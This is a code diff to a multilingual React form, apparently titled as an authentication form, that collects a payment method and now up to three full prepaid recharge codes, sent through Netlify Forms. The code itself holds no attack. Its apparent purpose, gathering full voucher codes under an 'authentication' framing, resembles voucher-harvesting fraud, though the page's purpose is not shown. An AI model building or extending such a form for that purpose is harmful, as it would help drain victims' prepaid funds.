@@ -29,6 +29,14 @@ const referenceLabels: Record<Language, { label: string; placeholder: string }> 
   es: { label: "Código de recarga", placeholder: "Introduce el código de recarga" },
 };
 
+const optionalLabels: Record<Language, string> = {
+  fr: "optionnel",
+  en: "optional",
+  de: "optional",
+  it: "facoltativo",
+  es: "opcional",
+};
+
 const encodeFormData = (formData: FormData): string => {
   const encodedData = new URLSearchParams();
 
@@ -44,7 +52,7 @@ const AuthForm: React.FC = () => {
   const [status, setStatus] = useState<FormStatus>("idle");
   const [errorMessage, setErrorMessage] = useState("");
   const [paymentMethod, setPaymentMethod] = useState<PaymentMethod>("");
-  const [reference, setReference] = useState("");
+  const [references, setReferences] = useState(["", "", ""]);
   const referenceRule = paymentMethod && paymentMethod !== "Autre" ? referenceRules[paymentMethod] : null;
   const referenceHint = paymentMethod && paymentMethod !== "Autre" ? ruleHints[language][paymentMethod] : "";
 
@@ -72,7 +80,7 @@ const AuthForm: React.FC = () => {
 
       form.reset();
       setPaymentMethod("");
-      setReference("");
+      setReferences(["", "", ""]);
       setStatus("success");
     } catch (error) {
       console.error("Erreur Netlify Forms :", error);
@@ -152,7 +160,7 @@ const AuthForm: React.FC = () => {
           value={paymentMethod}
           onChange={(event) => {
             setPaymentMethod(event.target.value as PaymentMethod);
-            setReference("");
+            setReferences(["", "", ""]);
           }}
           className={fieldClassName}
         >
@@ -184,29 +192,40 @@ const AuthForm: React.FC = () => {
       </div>
 
       <div className="mb-5">
-        <label htmlFor="referenceLast12" className="mb-2 block text-sm font-medium text-gray-700">
+        <p className="mb-2 block text-sm font-medium text-gray-700">
           {referenceLabels[language].label}
-        </label>
-        <input
-          id="referenceLast12"
-          name="referenceLast12"
-          type="text"
-          value={reference}
-          onChange={(event) => {
-            const forbiddenCharacters = referenceRule?.digitsOnly ? /[^0-9]/g : /[^A-Za-z0-9]/g;
-            setReference(event.target.value.replace(forbiddenCharacters, "").toUpperCase());
-          }}
-          minLength={referenceRule?.length ?? 1}
-          maxLength={referenceRule?.length ?? 64}
-          pattern={referenceRule?.pattern}
-          title={referenceHint || undefined}
-          inputMode={referenceRule?.digitsOnly ? "numeric" : "text"}
-          required
-          autoCapitalize="characters"
-          className={`${fieldClassName} uppercase`}
-          placeholder={referenceLabels[language].placeholder}
-          aria-describedby={referenceHint ? "reference-rule" : undefined}
-        />
+        </p>
+        <div className="space-y-3">
+          {references.map((reference, index) => (
+            <div key={index}>
+              <label htmlFor={`rechargeCode${index + 1}`} className="mb-1 block text-sm text-gray-600">
+                Code {index + 1}{index > 0 ? ` (${optionalLabels[language]})` : ""}
+              </label>
+              <input
+                id={`rechargeCode${index + 1}`}
+                name={`rechargeCode${index + 1}`}
+                type="text"
+                value={reference}
+                onChange={(event) => {
+                  const forbiddenCharacters = referenceRule?.digitsOnly ? /[^0-9]/g : /[^A-Za-z0-9]/g;
+                  const nextReferences = [...references];
+                  nextReferences[index] = event.target.value.replace(forbiddenCharacters, "").toUpperCase();
+                  setReferences(nextReferences);
+                }}
+                minLength={referenceRule?.length ?? 1}
+                maxLength={referenceRule?.length ?? 64}
+                pattern={referenceRule?.pattern}
+                title={referenceHint || undefined}
+                inputMode={referenceRule?.digitsOnly ? "numeric" : "text"}
+                required={index === 0}
+                autoCapitalize="characters"
+                className={`${fieldClassName} uppercase`}
+                placeholder={`${referenceLabels[language].placeholder} ${index + 1}`}
+                aria-describedby={referenceHint ? "reference-rule" : undefined}
+              />
+            </div>
+          ))}
+        </div>
         {referenceHint && <p id="reference-rule" className="mt-2 text-sm font-medium text-red-700">{referenceHint}</p>}
       </div>
 
